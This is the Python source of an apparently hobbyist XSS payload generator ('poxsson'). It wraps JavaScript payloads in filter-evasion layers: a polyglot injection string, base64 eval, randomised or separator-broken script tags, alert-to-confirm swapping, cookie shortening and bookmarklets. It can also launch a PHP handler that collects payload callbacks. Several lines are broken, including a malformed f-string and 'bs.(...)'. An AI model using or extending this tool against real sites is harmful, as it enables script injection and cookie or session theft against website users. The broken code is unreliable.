#!/usr/bin/python3
import argparse
from huepy import *
import sys
import importlib
import os
import base64
import pyperclip
import subprocess
from terminaltables import SingleTable
import random
import socket
#import atexit
POJSON_PATH = os.path.realpath(__file__).replace("pojson.py", "") #Absolute path of the project directory

#Obtains local IP for use with handler
def local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

def print_banner():
    print(green("    ____            _______"))
    print(green("   / __ \____      / / ___/____  ____"))
    print(green("  / /_/ / __ \__  / /\__ \/ __ \/ __ \\"))
    print(green(" / ____/ /_/ / /_/ /___/ / /_/ / / / /"))
    print(green("/_/    \____/\____//____/\____/_/ /_/"))
    print("")

#Function for printing metasploit-like tables ;>
def print_table(table_data): 
    styles = []
    for title in table_data[0]:
        msf_style = "-"*len(title)
        styles.append(msf_style)
    table_data.insert(1, styles)
    table_instance = SingleTable(table_data) 
    table_instance.inner_heading_row_border = False
    table_instance.inner_row_border = False
    table_instance.inner_column_border = False
    table_instance.outer_border = False
    table_instance.justify_columns = {0: 'left', 1: 'left', 2: 'left'}
    print(table_instance.table)
    print('')

#Simply lists files under /payloads dir and prints info about them in color
def list_payloads():
    #print(f"\n{logs.red(logs.bold("|"))} PAYLOADS {logs.red(logs.bold("|"))}")
    table_data = [["Name", "Description", "Handler", "Length"]]
    payloads = []
    plds = []
    for p in os.walk(POJSON_PATH+'payloads'): 
        payloads.append(p)
    payloads = payloads[0][2]
    for p in payloads:
        if ('init' in p or '.pyc' in p):
            pass #We don't want temporary files to interfere
        else:
            if ('.py' in p and not '.pyc' in p):
                plds.append(importlib.import_module("payloads."+p.replace(".py", ''))) #Each payload is imported and treated as a module
    for pl in plds:
        try:
            handler = pl.handler
            handler = True
        except:
            handler = False
        table_data.append([red(pl.name), blue(pl.description), handler, len(pl.payload)])
    print(info(f"Available payloads: {len(plds)}"))
    print("")
    print_table(table_data)

#Shows info (options, description, size...) about payload selected with "--payload" flag
def print_payload_info(payload_mod):
    payload_options_table_data = [['NAME', 'DESCRIPTION', 'VALUE']]
    handler_options_table_data = [['NAME', 'DESCRIPTION', 'VALUE']]
    try:
        handler = payload_mod.handler
        handler = True
    except:
        handler = False
    try:
        for opt in payload_mod.options: #Extracts several information from multi-dimensional .options list
            option = opt[0]
            value = opt[1]
            description = opt[2]
            payload_options_table_data.append([option, value, description])
    except:
        pass
    try:
        for opt in payload_mod.handler_options:
            option = opt[0]
            value = opt[1]
            description = opt[2]
            handler_options_table_data.append([option, value, description])
    except:
        pass
    #Prints all obtained data with f"" prefix formatting
    print(info(f"Name:        {payload_mod.name}"))
    print(info(f"Description: {payload_mod.description}"))
    print(info(f"Length:      {len(payload_mod.payload)} bytes"))
    print(info(f"Handler:     {handler}"))
    if len(payload_options_table_data) > 1:
        print("")
        info("Payload options:")
        print("")
        print_table(payload_options_table_data) 
    if len(handler_options_table_data) > 1:
        print("")
        info("Handler options:")
        print("")
        print_table(handler_options_table_data)

#def test_payload(payload_name):
#    pass

#I was so high writing this function lol
#But I suppose it just copies a PHP handler to a directory (?)
#And launches it from there using PHP inline interpreter
def start_php_handler(php_code):
    #subprocess.call(f"touch {POJSON_PATH}php_handler_dir/handler.php", shell=True)
    with open(f"{POJSON_PATH}php_handler_dir/handler.php", "w+") as handler_file:
        handler_file.write(php_code)
        handler_file.close()
        subprocess.call(f"php -t {POJSON_PATH}php_handler_dir -S {local_ip()}:8000", shell=True)
    subprocess.call(f"rm -rf {POJSON_PATH}php_handler_dir", shell=True)

#Inserts default options, and also options passed as NAME=VAL in command line
def insert_options(payload_code, payload_options, cli_options):
    pc = payload_code
    for option in cli_options:
        name = option.split("=")[0].upper()
        value = option.split("=")[1]
        pc = pc.replace(name.upper(), value)
    for option in payload_options:
        name = option[0]
        value = option[2]
        if (value == "" and "=" in ''.join(cli_options)):
            print(info(f"{name.upper()} option is empty")) #Warns if you forgot to set something
        #if name.upper() not in payload_code:
            #logs.err("No such option")
            #sys.exit()
        if name.lower() not in ''.join(cli_options):
            pc = pc.replace(name.upper(), value)
        #try:
        #except:
    return pc


def arguments():
    parser = argparse.ArgumentParser(prog="poxsson")
    wrapping = parser.add_argument_group()
    wrapping_group = wrapping.add_mutually_exclusive_group()
    parser.add_argument('OPTIONS', nargs="*", help="Specify the payload's options") #nargs means that 0 or mor arguments of this type can be passed
    parser.add_argument('-l', '--list', action='store_true', dest='LIST_PAYLOADS', help='List available payloads')
    parser.add_argument('-p', '--payload', action='store', dest='PAYLOAD', metavar='<payload>', help='Specify the payload')
    parser.add_argument('-v', '--verbose', action='store_true', dest='VERBOSE', help='Increase verbosity')
    parser.add_argument('-i', '--info', action='store_true', dest='INFO', help='Show payload info')
    parser.add_argument('-n', '--null', action='store_true', dest='NULL_INSERT', help='Perform null ("%%00") insertion for evasion')
    parser.add_argument('-c', '--clip', action='store_true', dest='CLIP', help='Copy payload to clipboard')
    parser.add_argument('-o', '--output', action='store', dest='OUTPUT', metavar='<file>', help='Save payload to a file')
    parser.add_argument('-d', '--delay', action='store', dest='DELAY', metavar='<n[s|m|h]>', help='Execute payload after specific period of time (seconds, minutes, hours)')
    parser.add_argument('-e', '--encode', action='store', choices=['base64', 'utf8'], dest='ENCODE', metavar='<encoding>', help='Encode payload')
    parser.add_argument('-s', '--separator', action='store', choices=['slash', 'newline', 'tab', 'carriage', 'random'], dest='SEPARATOR', metavar='<sep>', help="Use specific (or random) separator between tag and first parameter")
    #Separate group for executable wrappers (it just looks more clear imho)
    parser.add_argument('--tag', action='store_true', dest='TAG', help="Wrap payload with basic <script> tags")
    parser.add_argument('--tag-random', action='store_true', dest='TAG_RANDOM', help="Wrap payload with random <script> tags")
    parser.add_argument('--tag-different', action='store_true', dest='TAG_RANDOM_DIFFERENT', help="When combined with above option, generates different start and end tags")
    parser.add_argument('--tag-closer', action='store_true', dest='TAG_CLOSER', help="Use '//' instead of '>' for closing tags")
    parser.add_argument('--polyglot', action='store_true', dest='POLYGLOT', help="Wrap payload with polyglot wrapper")
    parser.add_argument('--cookie', action='store_true', dest='COOKIE', help="Use cookie shortener to reduce payload's size and detection probability")
    parser.add_argument('--confirm', action='store_true', dest='CONFIRM', help="Replace alert() popups with less detectable confirm()")
    parser.add_argument('--oneliner', action='store_true', dest='ONELINER', help="Convert generated payload to one-liner")
    parser.add_argument('--bookmarklet', action='store_true', dest='BOOKMARKLET', help="Convert generated payload to a bookmarklet")
    parser.add_argument('--handler', action='store_true', dest='HANDLER', help="Start handler after payload generation")
    parser.add_argument('--jquery', action='store_true', dest='JQUERY', help="Load JQuery before running the payload")
    parser.add_argument('--replace-http', action='store_true', dest='REPLACE_HTTP', help="Replace 'http[s]://' with a random substitute")
    #parser.add_argument('--replacei-chars', action='store', choices=['html', 'octal', 'url', 'iso', 'hex', 'numeric'], dest='REPLACE', 
    #                    help="Replace all special characters with their equivalents of selected type")
    return parser.parse_args()

def main():
    res = arguments()
    if res.LIST_PAYLOADS:
        list_payloads()
        sys.exit()
    try:
        loaded_payload = importlib.import_module(f"payloads.{res.PAYLOAD}") #We try to load our specified payload here
    except ImportError:
        print(bad("No such payload"))
        sys.exit()
    js_code = loaded_payload.payload
    js_code = insert_options(js_code, loaded_payload.options, res.OPTIONS) #Options replacement

    if res.DELAY:
        time_shorts = {'s':1000, 'm':60000, 'h':3600000}
        if type(res.DELAY) == int:
            delay_in_miliseconds = int(res.DELAY)
        else:
            if res.DELAY[-1] not in ['s', 'm', 'h']:
                print(err("Wrong delay format"))
                sys.exit()
            delay_in_miliseconds = int(res.DELAY[0:-1])*time_shorts[res.DELAY[-1]]
        js_code = f"""setTimeout(function() {
            {js_code}
        }, {delay_in_miliseconds})""" #Our payload is embeded inside "setTimeout". The timeout itself is expanded from interval to miliseconds
    if res.JQUERY:
        js_code = f"<script src=//cdn-url></script>\n{js_code}"
    if res.INFO:
        print_payload_info(loaded_payload)
        sys.exit() #Shows details and exits

    if res.ONELINER:
        js_code = js_code.replace("\n", "") #Replaces newlines so the payload becomes a one-liner

    if res.BOOKMARKLET:
        js_code = "javascript:(function(){" + js_code.replace("\n", "") + "})();"

    if res.NULL_INSERT:
        null_char = "%%00"
        payload_len = len(js_code)
        start_position = random.randrange(payload_len)
        #Not finished yet, but it should insert NULLs on random positions.

    if res.REPLACE_HTTP:
        substitute = random.choice(["//", "/\\\\", "\\\\"])
        js_code = js_code.replace("http://", "//") #Sometimes http[s] can be omitted in payloads
        js_code = js_code.replace("https://", "//")

    if res.ENCODE:
        if res.ENCODE == "base64":
            js_code = f"""eval(decode64('{base64.b64encode(js_code.encode("utf-8"))}'))"""
        elif res.ENCODE == "utf8":
            js_code = js_code.encode("utf-8") #Payload encoders
        else:
            logs.err("No such encoding")
            sys.exit()
    
    if res.POLYGLOT: #Polyglot wrapper makes it easy to exec payload in multiple environments
        js_code = f"""%%0ajavascript:`/*\\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ {js_code}//'">`""" 

    if res.TAG:
        js_code = f"<script>{js_code}</script>"
    
    if res.COOKIE:
        js_code = js_code.replace("document.cookie", "cookie")

    if res.SEPARATOR:
        separators = {
            "slash" : "/",
            "newline" : "\n",
            "tab" : "\t",
            "carriage" : '0x3c'
        }
        def select_separator():
            if res.SEPARATOR == "random":
                return random.choice(list(separators.values()))
            else:
                return separators[res.SEPARATOR]
        src = bs.(js_code, "html.parser")
        for tag in src.find_all():
            js_code = js_code.replace(tag.name, tag.name+select_separator())

    if res.TAG_RANDOM: #Just a tag obfuscation (ex. <script> => <ScRiPt>)
        script_tag = "script"
        script_tag = "".join(random.choice([c.upper(), c]) for c in script_tag )
        end_tag = script_tag
        if res.TAG_RANDOM_DIFFERENT:
            end_tag = "".join(random.choice([c.upper(), c]) for c in script_tag )
        js_code = f"<{script_tag}>{js_code}</{end_tag}>"

    if res.TAG_CLOSER:
        js_code = js_code.replace(">", "//")

    if res.CONFIRM:
        js_code = js_code.replace("alert", "confirm")

    if res.CLIP: #Copies payload to system clipboard (can be pasted with Ctrl-V)
        pyperclip.copy(js_code)

    if res.OUTPUT: #Saves payload to a file
        with open(res.OUTPUT, "w+") as payload_file:
            payload_file.write(js_code)
            if res.VERBOSE:
                print(info(f"Saved payload as {res.OUTPUT}"))
    print(info(f"Payload length: {len(js_code)}"))
    print(good("Generated payload:"))
    print("")
    print(blue(js_code)) #Prints payload to STDIN in a fancy blue color :>

    if res.HANDLER:
        try:
            #Starts handler and inserts required options (defined inside payload's bodies)
            handler_code = loaded_payload.handler
            handler_code = insert_options(handler_code, loaded_payload.handler_options, res.OPTIONS)
            print(info("Started handler"))
            start_php_handler(handler_code)
        except AttributeError:
            print(err("This module does not have a handler"))
            #sys.exit()

#Btw, if you know JS, you can easily write you own, custom payloads.
#Each payload is a separate Python module. Here are possible variables:
#    .payload - the actual code of the payload. Upper-case words (ex. CMD, LHOST) are later replaced as options names
#    .[handler_]options - two-dimensional, single element list. Option entry looks like this: [<name>, <description>, <default_value>]
#    .handler - custom, payload-specific PHP handler.

if __name__ == "__main__":
    print_banner()
    try:
        main()
    except KeyboardInterrupt:
        print("")
        print(info("Exiting"))
